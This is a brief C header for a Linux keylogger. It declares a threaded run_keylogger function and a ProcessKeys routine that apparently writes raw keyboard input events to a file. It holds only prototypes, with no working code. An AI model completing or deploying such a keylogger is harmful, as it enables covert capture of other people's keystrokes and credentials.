//keylogger.h
#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/input.h>
#include <stdio.h>
#include <pthread.h>

/* FUNCTION PROTOTYPES */
void *run_keylogger(void *ptr);
void ProcessKeys (FILE *fptr, struct input_event ev);

#endif
